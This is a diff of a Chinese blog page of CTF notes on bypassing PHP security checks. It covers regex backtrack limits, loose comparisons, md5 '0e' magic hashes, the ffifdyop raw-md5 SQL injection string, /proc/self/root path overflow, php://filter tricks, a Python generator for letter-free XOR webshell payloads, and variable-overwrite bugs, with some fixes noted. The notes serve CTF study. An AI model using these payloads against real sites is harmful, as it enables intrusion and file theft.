+</span></span><span class=line><span class=cl>    if(preg_match(&#39;/.+?ctfshow/is&#39;, $f)){
+</span></span><span class=line><span class=cl>        die(&#39;bye!&#39;);
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>    if(stripos($f,&#39;36Dctfshow&#39;) === FALSE){
+</span></span><span class=line><span class=cl>        die(&#39;bye!!&#39;);
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    echo $flag;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>}
+</span></span></code></pre></div><p>回溯失败时会返回 false</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>&lt;?php
+</span></span><span class=line><span class=cl>$a = str_repeat(&#39;1111&#39;,250000);
+</span></span><span class=line><span class=cl>$b = $a.&#39;36Dctfshow&#39;;
+</span></span><span class=line><span class=cl>echo $b;
+</span></span></code></pre></div><p>这个漏洞的修复方法是使用 <code>===</code> 与返回值作比较, 例如</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>if (preg_match(&#39;xxx&#39;, &#39;yyy&#39;) === 0) {
+</span></span><span class=line><span class=cl>	// ...
+</span></span><span class=line><span class=cl>}
+</span></span></code></pre></div><p><code>0 === false</code> 返回 <code>false</code></p><p><strong>参考：</strong></p><p><a href=https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html target=_blank rel="noopener noreferrer">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p><p><a href=https://www.laruence.com/2010/06/08/1579.html target=_blank rel="noopener noreferrer">深悉正则(pcre)最大回溯/递归限制</a></p><h2 id=in_array class=headerLink><a href=#in_array class=header-mark></a>in_array()</h2><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105090.png title=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105090.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105090.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105090.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105090.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105090.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105090.png 2x" sizes=auto alt=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105090.png></a></figure></p><p>检查数组中是否存在某个值，将待搜索的值的类型自动转换为数组中的值的类型</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>var_dump</span><span class=p>(</span><span class=n>in_array</span><span class=p>(</span><span class=err>&#39;</span><span class=n>1abc</span><span class=err>&#39;</span><span class=p>,</span><span class=w> </span><span class=o>[</span><span class=n>1</span><span class=p>,</span><span class=n>2</span><span class=p>,</span><span class=n>3</span><span class=p>,</span><span class=n>4</span><span class=p>,</span><span class=n>5</span><span class=o>]</span><span class=p>));</span><span class=w> </span><span class=c1>// true</span><span class=w>
 </span></span></span><span class=line><span class=cl><span class=w></span><span class=n>var_dump</span><span class=p>(</span><span class=n>in_array</span><span class=p>(</span><span class=err>&#39;</span><span class=n>abc</span><span class=err>&#39;</span><span class=p>,</span><span class=w> </span><span class=o>[</span><span class=n>1</span><span class=p>,</span><span class=n>2</span><span class=p>,</span><span class=n>3</span><span class=p>,</span><span class=n>4</span><span class=p>,</span><span class=n>5</span><span class=o>]</span><span class=p>));</span><span class=w> </span><span class=c1>// false</span><span class=w>
 </span></span></span><span class=line><span class=cl><span class=w></span><span class=n>var_dump</span><span class=p>(</span><span class=n>in_array</span><span class=p>(</span><span class=err>&#39;</span><span class=n>abc</span><span class=err>&#39;</span><span class=p>,</span><span class=w> </span><span class=o>[</span><span class=n>0</span><span class=p>,</span><span class=n>1</span><span class=p>,</span><span class=n>2</span><span class=p>,</span><span class=n>3</span><span class=p>,</span><span class=n>4</span><span class=p>,</span><span class=n>5</span><span class=o>]</span><span class=p>));</span><span class=w> </span><span class=c1>// true</span><span class=w>
-</span></span></span></code></pre></div><p>漏洞修复方式如下：
-<code>in_array($_GET['n'], $allow, true);</code>
-<strong>PHP 8.0.0 之前</strong>，<code>string needle</code> 在非严格模式下将会匹配数组中的值 <code>0</code>，如果第三个参数 <code>strict</code> 的值为 <code>true</code> 则 <code>in_array()</code> 函数还会检查 <code>needle</code> 的<a href=https://www.php.net/manual/zh/language.types.php target=_blank rel="noopener noreferrer">类型</a>是否和 <code>haystack</code> 中的相同。</p><h2 id=is_numeric class=headerLink><a href=#is_numeric class=header-mark></a>is_numeric()</h2><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621724.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621724.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621724.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621724.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621724.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621724.png 2x" sizes=auto alt=image.png></a></figure>识别科学计数法
-<code>0123e4567 </code>返回 <code>true</code>
-包含非 <code>e</code> 字母返回 <code>false</code>
-可以尝试利用 base64 + bin2hex 找到一些只含 <code>e</code> 和数字的 payload
-在<strong>数字开头</strong>加入<strong>空格 换行符 tab 等特殊字符</strong>可以绕过检测</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>is_numeric</span><span class=p>(</span><span class=err>&#39;</span><span class=w> </span><span class=n>36</span><span class=err>&#39;</span><span class=p>);</span><span class=w> </span><span class=c1>// true</span><span class=w>
+</span></span></span></code></pre></div><p>漏洞修复方式如下：</p><p><code>in_array($_GET['n'], $allow, true);</code></p><p><strong>PHP 8.0.0 之前</strong>，<code>string needle</code> 在非严格模式下将会匹配数组中的值 <code>0</code>，如果第三个参数 <code>strict</code> 的值为 <code>true</code> 则 <code>in_array()</code> 函数还会检查 <code>needle</code> 的<a href=https://www.php.net/manual/zh/language.types.php target=_blank rel="noopener noreferrer">类型</a>是否和 <code>haystack</code> 中的相同。</p><h2 id=is_numeric class=headerLink><a href=#is_numeric class=header-mark></a>is_numeric()</h2><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105091.png title=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105091.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105091.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105091.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105091.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105091.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105091.png 2x" sizes=auto alt=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105091.png></a></figure></p><p>识别科学计数法</p><p><code>0123e4567 </code>返回 <code>true</code></p><p>包含非 <code>e</code> 字母返回 <code>false</code></p><p>可以尝试利用 base64 + bin2hex 找到一些只含 <code>e</code> 和数字的 payload</p><p>在<strong>数字开头</strong>加入<strong>空格 换行符 tab 等特殊字符</strong>可以绕过检测</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>is_numeric</span><span class=p>(</span><span class=err>&#39;</span><span class=w> </span><span class=n>36</span><span class=err>&#39;</span><span class=p>);</span><span class=w> </span><span class=c1>// true</span><span class=w>
 </span></span></span><span class=line><span class=cl><span class=w></span><span class=n>is_numeric</span><span class=p>(</span><span class=err>&#39;</span><span class=n>36</span><span class=w> </span><span class=err>&#39;</span><span class=p>);</span><span class=w> </span><span class=c1>// false</span><span class=w>
 </span></span></span><span class=line><span class=cl><span class=w></span><span class=n>is_numeric</span><span class=p>(</span><span class=err>&#39;</span><span class=n>3</span><span class=w> </span><span class=n>6</span><span class=err>&#39;</span><span class=p>);</span><span class=w> </span><span class=c1>// false</span><span class=w>
 </span></span></span><span class=line><span class=cl><span class=w>
@@ -173,483 +128,416 @@ echo $b;
 </span></span></span><span class=line><span class=cl><span class=w>
 </span></span></span><span class=line><span class=cl><span class=w></span><span class=n>is_numeric</span><span class=p>(</span><span class=s>&#34;36\n&#34;</span><span class=p>);</span><span class=w> </span><span class=c1>// false</span><span class=w>
 </span></span></span><span class=line><span class=cl><span class=w></span><span class=n>is_numeric</span><span class=p>(</span><span class=s>&#34;36\t&#34;</span><span class=p>);</span><span class=w> </span><span class=c1>// false</span><span class=w>
-</span></span></span></code></pre></div><h2 id=ereg class=headerLink><a href=#ereg class=header-mark></a>ereg()</h2><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621849.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621849.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621849.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621849.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621849.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621849.png 2x" sizes=auto alt=image.png></a></figure></p><h3 id=00-截断 class=headerLink><a href=#00-%e6%88%aa%e6%96%ad class=header-mark></a>%00 截断</h3><p><code>ereg()</code>函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用<code>%00</code>截断正则匹配</p><h3 id=数组截断 class=headerLink><a href=#%e6%95%b0%e7%bb%84%e6%88%aa%e6%96%ad class=header-mark></a>数组截断</h3><p><code>ereg()</code>只能处理字符串的，遇到数组做参数返回NULL</p><h2 id=trim class=headerLink><a href=#trim class=header-mark></a>trim()</h2><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621771.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621771.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621771.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621771.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621771.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621771.png 2x" sizes=auto alt=image.png></a></figure>不过滤 <code>\f</code> 换页符, url 编码后是<code>%0c36</code></p><h2 id=strrev class=headerLink><a href=#strrev class=header-mark></a>strrev()</h2><p>反转字符串，常出现在<code>%00</code>截断漏洞中
-<strong>注：</strong><code>**%00**</code><strong>是一个整体，不会反转成</strong><code>**00%**</code></p><h2 id=md5sha1-绕过 class=headerLink><a href=#md5sha1-%e7%bb%95%e8%bf%87 class=header-mark></a>MD5/sha1 绕过(==、===)</h2><pre tabindex=0><code>if ($name != $password &amp;&amp; md5($name) == md5($password)){
-        echo $flag;
-    }
-</code></pre><p>既要两变量个值不相同，又要两个变量md5值一样，
-可以发现此时判断md5值是否一样用的是弱类型比较==</p><h3 id=0e绕过 class=headerLink><a href=#0e%e7%bb%95%e8%bf%87 class=header-mark></a>0E绕过</h3><p>可以使用带<strong>0e</strong>开头的数字穿进行传递参数，可以使用以0E开头的hash值绕过，因为处理hash字符串时，PHP会将每一个以<strong>0E</strong>开头的哈希值解释为0，那么只要传入的不同字符串经过哈希以后是以<strong>0E</strong>开头的，那么PHP会认为它们相同</p><ol><li>MD5(值)计算后结果开头是0e。0e开头是让PHP把这段字符串认为是科学计数法字符串的先决条件。</li><li>0e后面全是数字。例如, 0e123==0e234,0的N次方始终是0,所以弱类型比较可以相等。
-满足这两个条件(MD5后结果开头为0e， 且后面全部是数字) 的字符串如下：
-另：0e开头的数字s878926199a
-0e545993274517709034328855841020
-s155964671a
-0e342768416822451524974117254469
-s214587387a
-0e848240448830537924465865611904
-s214587387a
-0e848240448830537924465865611904
-s878926199a
-0e545993274517709034328855841020
-s1091221200a
-0e940624217856561557816327384675
-s1885207154a
-0e509367213418206700842008763514
-s1502113478a
-0e861580163291561247404381396064
-s1885207154a
-0e509367213418206700842008763514
-s1836677006a
-0e481036490867661113260034900752
-s155964671a
-0e342768416822451524974117254469
-s1184209335a
-0e072485820392773389523109082030
-s1665632922a
-0e731198061491163073197128363787
-s1502113478a
-0e861580163291561247404381396064
-s1836677006a
-0e481036490867661113260034900752
-s1091221200a
-0e940624217856561557816327384675
-s155964671a
-0e342768416822451524974117254469
-s1502113478a
-0e861580163291561247404381396064
-s155964671a
-0e342768416822451524974117254469
-s1665632922a
-0e731198061491163073197128363787
-s155964671a
-0e342768416822451524974117254469
-s1091221200a
-0e940624217856561557816327384675
-s1836677006a
-0e481036490867661113260034900752
-s1885207154a
-0e509367213418206700842008763514
-s532378020a
-0e220463095855511507588041205815
-s878926199a
-0e545993274517709034328855841020
-s1091221200a
-0e940624217856561557816327384675
-s214587387a
-0e848240448830537924465865611904
-s1502113478a
-0e861580163291561247404381396064
-s1091221200a
-0e940624217856561557816327384675
-s1665632922a
-0e731198061491163073197128363787
-s1885207154a
-0e509367213418206700842008763514
-s1836677006a
-0e481036490867661113260034900752
-s1665632922a
-0e731198061491163073197128363787
-s878926199a
-0e545993274517709034328855841020
-240610708
-0e462097431906509019562988736854
-314282422
-<code>md5 (md5())</code> 后满足这两个条件的字符串也需要了解：
-:::tips
-bDLytmyGm2xQyaLNhWn
-770hQgrBOjrcqftrlaZk
-7r41GXCH2Ksu2JNT3BYM
-:::</li></ol><h3 id=数组绕过-1 class=headerLink><a href=#%e6%95%b0%e7%bb%84%e7%bb%95%e8%bf%87-1 class=header-mark></a>数组绕过</h3><p>(PHP5和PHP7可以，PHP8不行)，如<code>name[]=123&amp;password[]=456</code>，md5/sha1不能加密数组，故两个md5返回的都是<code>null</code></p><h3 id=md5碰撞 class=headerLink><a href=#md5%e7%a2%b0%e6%92%9e class=header-mark></a>md5碰撞</h3><p>利用 fastcoll 进行 md5 碰撞，生成两个字面值不同但 md5 相同的文件
-若遇到<code>===</code>这样的强类型比较，方法一就失效了，方法二仍然有效，或者还可以使用软件fastcoll进行md5碰撞，生成两个字符串使得他们的md5值相同</p><h5 id=fastcoll-使用 class=headerLink><a href=#fastcoll-%e4%bd%bf%e7%94%a8 class=header-mark></a>fastcoll 使用：</h5><p><strong>在</strong><code>**1.txt**</code><strong>中写入一句话木马</strong><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621738.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621738.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621738.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621738.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621738.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621738.png 2x" sizes=auto alt=image.png></a></figure>然后把文件丢到 fastcoll 里跑一下<figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621209.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621209.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621209.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621209.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621209.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621209.png 2x" sizes=auto alt=image.png></a></figure>得到两个文件，这两文件读到字符串是不一样的，但md5后是一样的。
-利用脚本读取</p><pre tabindex=0><code>&lt;?php
-$a = file_get_contents(&#39;C:\Users\DELL\Desktop\tool\1_msg1.txt&#39;);
-$b = file_get_contents(&#39;C:\Users\DELL\Desktop\tool\1_msg2.txt&#39;);
-print_r($a . &#34;&lt;br&gt;&#34;);
-print_r($b . &#34;&lt;br&gt;&#34;);
-print_r(var_dump($a === $b) . &#34;&lt;br&gt;&#34;);   // bool(false)
-print_r(var_dump(md5($a) === md5($b)) . &#34;&lt;br&gt;&#34;);   // bool(true)
-</code></pre><h3 id=passwordmd5passtrue绕过 class=headerLink><a href=#passwordmd5passtrue%e7%bb%95%e8%bf%87 class=header-mark></a>password=md5($pass,true)绕过</h3><p>md5() 函数会将我们输入的值，加密，然后转换成16字符的二进制格式，由于<code>ffifdyop</code>被md5加密后的<code>276f722736c95d99e921722cf9ed621c</code>转换成16位原始二进制格式为<code>'or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c</code>，这个字符串前几位刚好是<code>' or '6</code></p><table><thead><tr><th><strong>MD5加密</strong></th><th><strong>276F722736C95D99E921722CF9ED621C</strong></th></tr></thead><tbody><tr><td><strong>16位原始二进制格式</strong></td><td><strong>&lsquo;or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c</strong></td></tr><tr><td><strong>string</strong></td><td><strong>&lsquo;or’6]!r,b</strong></td></tr></tbody></table><h2 id=目录穿越 class=headerLink><a href=#%e7%9b%ae%e5%bd%95%e7%a9%bf%e8%b6%8a class=header-mark></a>目录穿越</h2><p>通过绝对路径/相对路径绕过正则对文件名的检测, 例如 <code>preg_match('/flag.php/', $str)</code></p><pre tabindex=0><code>./flag.php
-./ctfshow/../flag.php
-/var/www/html/flag.php
-</code></pre><p>利用 Linux 下的软链接绕过
-<a href=https://www.anquanke.com/post/id/213235 target=_blank rel="noopener noreferrer">php源码分析 require_once 绕过不能重复包含文件的限制</a></p><pre tabindex=0><code>/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p
-roc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro
-c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/
-self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se
-lf/root/proc/self/root/var/www/html/flag.php
-</code></pre><h2 id=伪协议 class=headerLink><a href=#%e4%bc%aa%e5%8d%8f%e8%ae%ae class=header-mark></a>伪协议</h2><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621334.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621334.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621334.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621334.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621334.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621334.png 2x" sizes=auto alt=image.png></a></figure>常见的 <code>php://filter</code> <code>php://input</code> <code>data://</code> 都很熟悉了
-下面是一些不是很常见的 payload</p><pre tabindex=0><code>?file=compress.zlib://flag.php
-?file=php://filter/ctfshow/resource=flag.php
-</code></pre><p><code>**php://filter**</code>** 遇到不存在的过滤器会直接跳过, 可以绕过一些对关键字的检测**</p><h2 id=is_file目录溢出 class=headerLink><a href=#is_file%e7%9b%ae%e5%bd%95%e6%ba%a2%e5%87%ba class=header-mark></a><code>is_file</code>目录溢出</h2><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621308.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621308.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621308.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621308.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621308.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621308.png 2x" sizes=auto alt=image.png></a></figure><code>is_file()</code>目录溢出漏洞, 大概意思就是通过多级嵌套绕过检测
-这里的<code>/proc/self/root</code>是一个指向<code>/</code>的软连接<figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621341.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621341.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621341.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621341.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621341.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621341.png 2x" sizes=auto alt=image.png></a></figure><code>is_file</code>函数能处理的长度有限,用<code>/proc/self/root</code>可以目录溢出</p><pre tabindex=0><code>/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
-</code></pre><h2 id=三元运算符 class=headerLink><a href=#%e4%b8%89%e5%85%83%e8%bf%90%e7%ae%97%e7%ac%a6 class=header-mark></a>三元运算符</h2><p><code>(expr1)?(expr2):(expr3); //表达式1?表达式2:表达式3</code>
-如果条件“expr1”成立，则执行语句“expr2”，否则执行“expr3”
-有时候构造不带分号 payload 时需要用到三目运算符</p><h2 id=位运算 class=headerLink><a href=#%e4%bd%8d%e8%bf%90%e7%ae%97 class=header-mark></a>位运算</h2><p>通过 <code>&</code> <code>|``^</code> <code>~</code> 来构造无字母数字的 webshell
-原理是 PHP 7 支持以 <code>($a)($b)</code> 的形式调用函数并传参
-<a href=https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html target=_blank rel="noopener noreferrer">无字母数字webshell之提高篇</a>
-python 脚本</p><pre tabindex=0><code>import re
-
-preg = &#39;[A-Za-z0-9_\%\\|\~\&#39;\,\.\:\@\&amp;\*\+\-]+&#39;
-
-def convertToURL(s):
-    if s &lt; 16:
-        return &#39;%0&#39; + str(hex(s).replace(&#39;0x&#39;, &#39;&#39;))
-    else:
-        return &#39;%&#39; + str(hex(s).replace(&#39;0x&#39;, &#39;&#39;))
-
-def generateDicts():
-    dicts = {}
-    for i in range(256):
-        for j in range(256):
-            if not re.match(preg, chr(i), re.I) and not re.match(preg, chr(j), re.I):
-                k = i ^ j
-                if k in range(32, 127):
-                    if not k in dicts.keys():
-                        dicts[chr(k)] = [convertToURL(i), convertToURL(j)]
-    return dicts
-
-def generatePayload(dicts, payload):
-    s1 = &#39;&#39;
-    s2 = &#39;&#39;
-    for s in payload:
-        s1 += dicts[s][0]
-        s2 += dicts[s][1]
-    return f&#39;(&#34;{s1}&#34;^&#34;{s2}&#34;)&#39;
-
-dicts = generateDicts()
-a = generatePayload(dicts, r&#39;get_ctfshow_fl0g&#39;)
-print(a)
-</code></pre><p>运算方式可以自己改
-按位取反 <code>~</code> 的话直接在 PHP 里面写就行了</p><h2 id=函数与数字运算 class=headerLink><a href=#%e5%87%bd%e6%95%b0%e4%b8%8e%e6%95%b0%e5%ad%97%e8%bf%90%e7%ae%97 class=header-mark></a>函数与数字运算</h2><p>在 PHP 中, <strong>函数</strong>与<strong>数字</strong>进行运算的时候, <strong>函数能够被正常执行</strong>
-<code>1+phpinfo()+1;</code>
-<code>+</code> <code>-</code> <code>*``/</code> <code>&``|</code> 都行, 另外还有 <code>&&</code> <code>||</code></p><h2 id=变量覆盖 class=headerLink><a href=#%e5%8f%98%e9%87%8f%e8%a6%86%e7%9b%96 class=header-mark></a>变量覆盖</h2><p>通常将可以用自定义的参数值替换原有变量值的情况称为变量覆盖漏洞。
-经常导致变量覆盖漏洞场景有：<code>$$</code>使用不当，<code>extract()</code>函数使用不当，<code>parse_str()</code>函数使用不当，<code>import_request_variables()</code>使用不当，开启了全局变量注册等。</p><h3 id=变量覆盖函数 class=headerLink><a href=#%e5%8f%98%e9%87%8f%e8%a6%86%e7%9b%96%e5%87%bd%e6%95%b0 class=header-mark></a>变量覆盖函数</h3><p>在PHP 中有如下几种变量覆盖的方式。</p><ol><li>PHP语法导致的变量覆盖</li></ol><pre tabindex=0><code>&lt;? php
-$a = &#34;want_to_be_a_cat&#34;;
-$b = &#34;miaow&#34;;
-$test = $a;
-$$test = $b;
-var_dump($want_to_be_a_cat); //输出miaow
-</code></pre><ol start=2><li>PHP函数导致的变量覆盖(<code>extract</code>、<code>parse_str</code>、<code>mb_parse_str</code>、<code>import_request_variables</code>)</li></ol><pre tabindex=0><code>&lt;? php
-$a = &#34;want_a_cat&#34;;
-$b = &#34;miao&#34;;
-extract([$a =&gt;$b]);
-var_dump($want_a_cat);//输出miao
-//parse_str(&#34;want_a_cat=miao&#34;);//只在 PHP5.2中出现
-//var_dump($want_a_cat);//输出miao
-//mb_parse_str(&#34;want_a_cat=miao&#34;);//只在 PHP5.2中出现
-//var_dump($want_a_cat);//输出miao
-//import_request_variables(&#34;p&#34;, &#34;&#34;);
-//var_dump($want_a_cat); //传入 want_a_cat=miao,输出miao
-</code></pre><ol start=3><li>PHP 配置项导致变量覆盖(register_globals: php. ini 中的一个配置项,配置为 true 之后入 GET/POST 参数都会被赋成变量)</li></ol><pre tabindex=0><code>&lt;? php
-var_dump($want_to_be_a_cat);//传入want_to_be_a_cat=miao,输出miao
-</code></pre><h3 id=heading class=headerLink><a href=#heading class=header-mark></a><code>$$</code></h3><p><code>$$</code>导致的变量覆盖问题在CTF代码审计题目中经常在<code>foreach</code>中出现<figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621387.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621387.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621387.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621387.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621387.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202403041621387.png 2x" sizes=auto alt=image.png></a></figure>如以下代码，使用<code>foreach</code>来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。因此就产生了变量覆盖漏洞。请求<code>?name=test</code>会将<code>$name</code>的值覆盖，变为<code>test</code>。</p><pre tabindex=0><code>&lt;?php
-   //?name=test
-   
-   //output:string(4) &#34;name&#34; string(4) &#34;test&#34; string(4) &#34;test&#34; test
-   
-   $name=&#39;thinking&#39;;
-
-   foreach ($_GET as $key =&gt; $value)
-   {
-       $$key = $value;
-   }
-   var_dump($key);
-   var_dump($value);
-   var_dump($$key);
-
-   echo $name;
-?&gt;
-</code></pre><h4 id=例题1 class=headerLink><a href=#%e4%be%8b%e9%a2%981 class=header-mark></a>例题1</h4><pre tabindex=0><code>&lt;?php
-
-   $flag = &#39;flaaaaaag&#39;;
-
-   $_403 = &#34;Access Denied&#34;;
-
-   $_200 = &#34;Welcome Admin&#34;;
-
-   if ($_SERVER[&#34;REQUEST_METHOD&#34;] != &#34;POST&#34;)
-   {
-         die(&#34;BugsBunnyCTF is here :p…&#34;);
-   }
-   if ( !isset($_POST[&#34;flag&#34;]) )
-   {
-         die($_403);
-   }
-   foreach ($_GET as $key =&gt; $value)
-   {
-         $$key = $$value;
-   }
-   foreach ($_POST as $key =&gt; $value)
-   {
-         $$key = $value;
-   }
-   if ( $_POST[&#34;flag&#34;] !== $flag )
-   {
-         die($_403);
-   }
-   echo &#34;flaaaaaag&#34;;
-   die($_200);
-   
-?&gt;
-</code></pre><p>**题目分析： **
-需要满足3个if里的条件才能获取<code>$flag</code>，题目中使用了两个<code>foreach</code>并且也使用了<code>$$</code>两个<code>foreach</code>中对<code>$$key</code>的处理是不一样的，满足条件后会将<code>$flag</code>里面的值打印出来。
-代码会将flag的值给覆盖掉，所以需要先将flag的值赋给<code>_200</code>或<code>_403</code>变量，然后利用<code>die($_200)</code>或<code>die($_403)</code>将flag打印出来。
-**解题方法： **
-由于代码会将<code>$flag</code>的值给覆盖掉，所以只能利用第一个<code>foreach</code>先将<code>$flag</code>的值赋给<code>$_200</code>，然后利用<code>die($_200)</code>将原本的flag值打印出来。
-<strong>最终payload：</strong>
